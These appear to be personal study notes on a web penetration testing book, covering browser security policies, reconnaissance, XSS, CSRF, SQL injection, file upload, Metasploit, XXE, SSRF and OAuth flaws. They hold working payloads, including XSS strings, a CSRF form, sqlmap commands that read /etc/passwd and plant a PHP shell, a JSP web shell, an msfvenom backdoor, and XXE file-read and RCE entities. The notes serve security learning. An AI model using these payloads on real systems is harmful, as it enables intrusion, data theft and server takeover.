# Mastering Modern Web Penetration Testing (notes)
Prakhar Prasad

## Ch1 - Common Security Protocols

### SOP

- Suppose you have logged into your email account on one tab. On another tab you have opened up a malicious website.
- If the malicious website tries to exfiltrate data from your email account through some JavaScript code, it will fail because of **same origin policy**.
- Only a website with the same **origin** will be allowed to do that: *protocol, port number, and the hostname of the webpage*.
- SOP is not only for JS but for cookies, AJAX, Flash, and so on. Data stored inside localStorage is also governed by this policy.
- Example: `http://google.com/` and `http://www.google.com/` do not have the same origin since the hostname is different.
- Run [this](code/sop.html) in your browser and take a look at the console.

### Switching origins

- Go to `google.com`
- In the console `document.domain = apple.com`
- **Can only switch origin if target page is a suffix of the current page.**
- So going from `images.google.com` to `google.com` will work. Not the reverse.
- Since `images.google.com` is not a suffix of `google.com` therefore it won't work.
- Also `google.com` to `com` won't work since it is a top-level domain.
- In chrome these protocols are allowed: `http, data, chrome, chrome-extension, https`

### CDM

- Cross-domain messaging.
- Introduced in HTML5, provides `postMessage()`

Sending
```js
receiver.postMessage('Hello','http://example.com')
```

Receiving
```js
window.addEventListener('message',function(event) {
if(event.origin != 'http://sender.com') return;
console.log('Received: ' + event.data,event);
},false);
```

### AJAX

- Allows exchanging data with the server without reloading the page. Works by using the XMLHTTPRequest() method of JS.
- But fetching or sending data to a server or URL which is at a different origin requires `Access-Control-Allow-Origin`
- Example [code](code/ajax.html)

### CORS

- A page running at origin A can send/receive data from a server at origin B.
- Web fonts, CSS, documents, and so on are loaded from different origins.
- Most CDNs which provide resource-hosting functionality typically allow any website or origin to interact with themselves.
- CORS works by adding a new HTTP header that allows the web server to interact with a list of whitelisted domains.
- CORS is browser enforced, the browser looks into the response headers and acts accordingly.

CORS headers
- Access-Control-Allow-Origin: response header
- Access-Control-Allow-Methods: response header
- Origin: request header

Pre-flight request
- Custom HTTP headers are sent
- The body MIME-type is different than text/plain
- The HTTP method is different than GET or POST

## Ch2 - Information Gathering

Google dorks
- backup.sql intext:"SELECT" ext:sql site:net
- Google Hacking for Penetration Testers
```
ext:pdf site:abhaynayar.com
site:abhaynayar.com
inurl:/downloads site:abhaynayar.com
intitle:login site:abhaynayar.com
backup.sql intext:"SELECT" ext:sql
```

Generate wordlists
```
$ cewl abhaynayar.com
```
Cookies, country, headers.
```
$ whatweb abhaynayar.com
```

Computer search engine
```
https://www.shodan.io/search?query=Werkzeug
```

Reverse IP Lookup
```
https://www.yougetsignal.com/tools/web-sites-on-web-server/
```

## Ch3 - XSS

### Reflected

Check if these characters are permitted `"'<>();[]{}AbC`

XSS in href attribute
```
javascript:alert(1)
javascript://%0d%0aalert(1);
javascript://%0d%0aalert(1);//http://derp.com
javascript://%0d%0alert(1);//.com
```

Correct values for JSON responses are typically `text/javascript` or `application/json` if your value is being reflected and if you get `text/html` try for an XSS.

### Stored

Markdown
```
[Hi](javascript:alert(1);)
```
Spoofed IP address
- Use the `X-Forwarded-For` header (used by HTTP proxies)
- `X-Forwarded-For: "><img src=x onerror=alert(0);>`

### Resources
- http://html5sec.org
- https://www.blueclosure.com/
- https://code.google.com/archive/p/domxsswiki/wikis/Introduction.wiki

## Ch4 - CSRF

JSON

```
<body onload=document.getElementById('xsrf').submit()>
<form id="xsrf" action="transfer" method=post enctype="text/plain">
<input name='{"username":"Attacker","amount":2500,"padding":"' value='garbage"}' type='hidden'>
</form>
```

- Sometimes the CSRF tokens aren't validated, try sending a request without a token.
- Sometimes the CSRF tokens are not mapped to the user, try using another user's token.
- Sometimes the CSRF token's presence is required but the value can be left blank or random string of same length.
- Sometimes the CSRF tokens do not have sufficient randomness, try guessing them.

## Ch5 - SQLi

[sqlmap](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

- technique: BEUSTQ
- dump:
    - `--current-user`
    - `--dbs`
    - `-D db_name --tables`
    - `-D db_name -T tbl_name --dump`
    - `-D db_name -T tbl_name --columns`
    - `-D db_name -T tbl_name --columns "col_name" --dump`
- `--wizard`
- `--dump-all`
- URL rewriting: uses \* as an injection point.
- Speeding up
    - `--threads 3`
    - `--null-connection`
    - `--keep-alive`
    - `--predict-output`
- Reading files
    - `--privileges`
    - `--file-read=/etc/passwd`
    - Ex. /var/www/config.inc , /var/www/html/config/config.inc.php
- Writing files
    - `--file-write=shell.php`
    - `--file-dest=/var/www/shell-php` 
    - PHP one-liner shell: `<?php system($_GET[1337]); ?>`
- POST requests
    - `-u URL --data="params" -p param_to_test`
    - Save the request and `sqlmap.py -r request.txt -p param_to_test`
- Cookies `--cookie="PHPSESSID=AAAAAAAAAAAAAAAAAAAAAAAA"`
- HTTP auth `--auth-cred and --auth-type`
- Database shell `--sql-shell`
- Command shell `--os-shell` or `--os-cmd "uname -a"`
- Tamper `--tamper charencode -v3`
- Proxy `--proxy="https://proxy.example.com:8080"`
- Tor `--tor`

# Ch6 - File upload

PHP functions used for os command execution
- system
- shell_exec
- passthru
- backticks
- popen
- exec
- pcntl_exec
- proc_open

JSP shell
```
<%
if (request.getParameter("cmd") != null) {
    out.println("Output: " + request.getParameter("cmd") + "<br />");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr); disr = dis.readLine();
    }
}
%>
```

Multi-functional webshells: https://github.com/b374k/b374k
```
$ php -f index.php -- -o shell.php -p PASSWORD
```

We can upload files such as HTML or SVG to get XSS.
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/
Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/
svg">
<script type="text/javascript">
alert("XSS: "+document.domain);
</script>
</svg>
```

Bypassing protections:
- Case sensitive blacklisting `pHp`
- MIME content type `text/php` to `image/gif`
- Bad extension checks: `.jpg.php`

Upload this as `.htacess` file. It executes
any file containing _php.gif as a valid PHP.
```
<FilesMatch "_php.gif">
SetHandler application/x-httpd-php
</FilesMatch>
```

If you upload this as `.htacess` then any file
with the extension `.lol` will execute as PHP.
```
AddType application/x-httpd-php .lol
```

Embedding code in images: http://www.thexifer.net

Further reading
- https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks
- http://soroush.secproject.com/downloadable/iis-semicolon-report.pdf

## Ch7 - Metasploit and web

Metasploit modules
- Auxiliary: scanning, fuzzing
- Exploit: return a shell
- Encoder: cloak, obfuscate
- Payload: payload after exploit
- Others: Nops, post-exploitation

Metasploit for web
```
msf > use auxiliary/scanner/http/
msf > use auxiliary/scanner/http/brute_dirs
msf > use auxiliary/scanner/http/dir_scanner
msf > use auxiliary/scanner/http/files_dir
msf > show options
msf > set THREADS 10
msf > set RHOSTS VICTIM_IP
...
```

Automated scanner
```
msf > load wmap
msf > wmap_sites –a protocol://host:port
msf > wmap_sites –l
msf > wmap_targets –t protocol://host:port
msf > wmap_targets –l
msf > wmap_run –t
msf > wmap_run –e
```

Web backdoor
```
$ msfvenom -l payloads
$ msfvenom -p php/meterpreter/bind_tcp --list-options
$ msfvenom -p php/meterpreter/bind_tcp LPORT=60000 > /root/msf/php-msf.php
$ msfconsole
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD php/meterpreter/bind_tcp
msf exploit(handler) > set RHOST VICTIM_IP
msf exploit(handler) > set LPORT 60000
```

If the session keeps ending, create a platform specific backdoor.

## Ch8 - XML attacks

XML Basics
- An XML document must contain only one root element.
- An attribute must always be quoted with either single quotes or double quotes.
- An XML DTD is document which is used to validate an XML document for certain criteria.
- An XML DTD can be internal or external. `<!DOCTYPE student SYSTEM "student.dtd">`

XML entities
- An XML entity is a representation of some information.
- A predefined entity is generally used to represent markup characters.
- We can define our own entities which will reference some information internally or externally.

Internal
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
	<!ELEMENT student (#PCDATA)>
	<!ENTITY name "James Jones">
]>
<student>&name;</student>
```

External
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
	<!ELEMENT student (#PCDATA)>
	<!ENTITY sname SYSTEM "https://abhaynayar.com/external.xml">
]>
<student>&sname;</student>
```

XXE attack

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
<!ENTITY oops SYSTEM "file:///etc/passwd">
]>
<student>
<name>&oops;</name>
</student>
```

- In some environments, it is possible to get a directory listing with the `file://` handler: `<!ENTITY oops SYSTEM "file:///etc/ ">`
- PHP base64 filter conversion
```
<!DOCTYPE student [
	<!ENTITY pwn SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<student>
<name>&pwn;</name>
</student>
```

SSRF through XXE

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
	<!ENTITY oops SYSTEM "http://scanme.nmap.org:20/">
]>
<student>
<name>&oops;</name>
</student>
```

RCE through XXE

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
	<!ENTITY rce SYSTEM "expect://id">
]>
<student>
<name>&rce;</name>
</student>
```

DoS through XXE

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
	<!ENTITY oops SYSTEM "file:///dev/random">
]>
<student>
<name>&oops;</name>
</student>
```

XML quadratic blowup

```
<?xml version="1.0"?>
<!DOCTYPE student [
<!ENTITY x "xxxxxxxxxxxxxxxxx..."> (50,000-100,000)
]>
<student>&x;&x;&x;&x;&x;&x;&x;&x;&x;...</student>
```

## Ch9 - Emerging attack vectors

### SSRF
https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit

- Port scanning: `http://scanme.nmap.org:1234/`
- `file://` to read files from the vulnerable server
- Protocol handlers:
	- SSH: `scp://`,`sftp://`
	- POP3
	- IMAP
	- SMTP
	- FTP
	- DICT
	- GOPHER
	- TFTP
	- JAR
	- LDAP

### IDOR

Read case studies and reports.

### DOM Clobbering

Run [this](code/dom-clobbering.html) code in your browser and take a look at the console.

### Relative Path Overwrite

- If you have an import in `example.com/path/index.php` for relative path `style.css` your css will be loaded from `example.com/path/style.css`
- But due to server side language flexibility, even this URL acts like the first: `example.com/path/index.php/this/works`
- For that reason, the relative path now becomes `example.com/path/index.php/this/works/style.css` and will be ignored.
- We can find endpoints where we control the content of the document and inject code such as in search pages.

- Sources
    - https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities
    - http://www.thespanner.co.uk/2014/03/21/rpo/

### UI redressing (clickjacking)

- This attack makes use of overlapping elements, transparent frames and social engineering.
- The attacker creates an iframe of one of the pages from the vulnerable web application.
- Just above the iframe there are some HTML elements that induce the user to perform actions on the iframe.

### PHP Object Injection

- User-supplied input getting passed to an `unserialize()`
- Magic functions `__construct()` `__destruct()` `__sleep()` `__wakeup()`

## Ch10 - OAuth 2.0 security

Read about it in RFC 6749.
```
resource owner ~> client application <~> server {resource, authorization}
```
| Component        | Description                                                                              |
|------------------|------------------------------------------------------------------------------------------|
| Redirect URI     | Determines the URI to redirect to once the flow is completed                             |
| Client ID        | Unique ID returned when the third party application is registered to the OAuth provider. |
| Client secret    | Secret token generated during the registration process and tied to the client ID.        |
| Receiving grants | There are two common authorization flows: authorization grant, implicit grant            |

Authorization grant

1. `prakharprasad.com` sends a request to `example.com/authorize`:`https://www.example.com/oauth/authorize?client_id=2190698099&redirect_uri= https%3A%2F%2Fprakharprasad.com%2Fredirect&response_type=code&scope=read`

```
- client_id
- redirect_uri
- response_type
- scope
```

2. after granting access through prompt you get redirected to `https://prakharprasad.com/redirect?code=af8SFAdas`
3. this callback url then makes another request to the `token` endpoint:`https://www.example.com/oauth/token?client_id=2190698099&client_secret=adb12hge&grant_type=authorization_code&code=af8SFAdas&redirect_uri=https%3A%2F%2Fprakharprasad.com%2Ftoken`

```
- client_id
- redirect_uri
- client_secret
- grant_type
- code
```

4. then `example.com` returns the auth token to `prakharprasad.com` using the parameters sent in the request: `Access Token = Auth Code + Client ID + Client Secret + Redirect URI`
5. the auth flow ends here. now `prakharprasad.com` can send requests to `example.com` using `access_token` and get user's information.


Implicit grant

1. `prakharprasad.com` sends the following request to `example.com/authorize`:`https://www.example.com/oauth/authorize?client_id=2190698099&redirect_uri=https%3A%2F%2Fprakharprasad.com%2Ftoken&response_type=token&scope=read,write`
2. the user is prompted to grant access of their `example.com` resources to `prakharprasad.com`
3. the `example.com` server directly sends the `access_token` to `https://prakharprasad.com/token#access_token=EAACEdEose0cBAE3vD` instead of first using a code to send another request

OAuth exploitation

open redirect (malform scope or `client_id` and hijack `redirect_uri`)

hijack flow (can change `redirect_uri` to get `access_token` but if only `http://example.com/token/callback` is allowed)
- directory traversal (we can use the following urls if we can save files on `example.com`)
```
http://example.com/token/callback/../../our/path
http://example.com/token/callback/.%0a./.%0d./our/path
http://example.com/token/callback/%252e%252e/%252e%252e/our/path
/our/path///../../http://example.com/token/callback/
http://example.com/token/callback/%2e%2e/%2e%2e/our/path
```
- naked domain (subdomain not specified)
```
https://controlledsubdomain.example.com/token/callback
https://www1.example.com/token/callback
https://files.example.com/token/callback
```
- tld suffix confusion (.com is specified use .com.br)
- open redirect on client (Covert Redirect)

force a malicious app installation
- use clickjacking
- should not have `X-FRAME-OPTIONS` header

## Ch11 - API testing


